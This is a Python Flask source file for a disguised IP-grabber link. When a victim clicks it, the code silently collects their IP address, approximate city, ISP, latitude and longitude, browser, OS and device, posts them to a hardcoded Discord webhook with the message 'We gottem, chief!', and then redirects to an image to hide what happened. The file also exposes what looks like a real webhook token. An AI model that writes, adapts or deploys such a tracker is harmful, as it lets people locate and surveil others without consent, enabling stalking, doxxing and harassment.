from flask import Flask, request, redirect
import requests
from user_agents import parse

# Initialize Flask app
app = Flask(__name__)

WEBHOOK_URL = "https://discordapp.com/api/webhooks/1360532705644773546/lc5c8r8P_MC-MJRytn7ea7ZaANatkhXlf15_sRYT6Ist5oV5eEM-KtRLUKWYZe0RrgKX"  # Your webhook URL here

@app.route('/track')
def track():
    # Get the user's IP address
    ip = request.remote_addr or 'unknown'

    # Get geo info (including latitude and longitude) from ipinfo.io
    geo = requests.get(f"https://ipinfo.io/{ip}/json").json()

    # Extract location details
    city = geo.get("city", "Unknown")
    region = geo.get("region", "Unknown")
    country = geo.get("country", "Unknown")
    org = geo.get("org", "Unknown")
    loc = geo.get("loc", "Unknown")  # This will return latitude and longitude as a string

    # If loc is not available, set latitude and longitude to Unknown
    if loc != "Unknown":
        latitude, longitude = loc.split(',')
    else:
        latitude, longitude = "Unknown", "Unknown"

    # Get the user-agent from request headers
    user_agent_string = request.headers.get('User-Agent', 'Unknown')
    user_agent = parse(user_agent_string)

    # Extract browser and OS details from the user-agent
    browser = user_agent.browser.family
    os = user_agent.os.family
    device = user_agent.device.family

    # Build the message with all details
    content = (
        f"# We gottem, chief!\n"
        f"👀 Click detected!\n"
        f"🌍 IP: `{ip}`\n"
        f"📍 Location: {city}, {region}, {country}\n"
        f"🏢 ISP: {org}\n"
        f"🧭 Latitude: {latitude}\n"
        f"🧭 Longitude: {longitude}\n"
        f"🖥️ Browser: {browser}\n"
        f"🖥️ OS: {os}\n"
        f"📱 Device: {device}"
    )

    # Send the message to Discord Webhook
    requests.post(WEBHOOK_URL, json={"content": content})

    # Redirect to your image link
    return redirect("https://www.smartage.pl/wp-content/uploads/2023/04/67-1.jpg")

if __name__ == "__main__":
    app.run(port=5000)
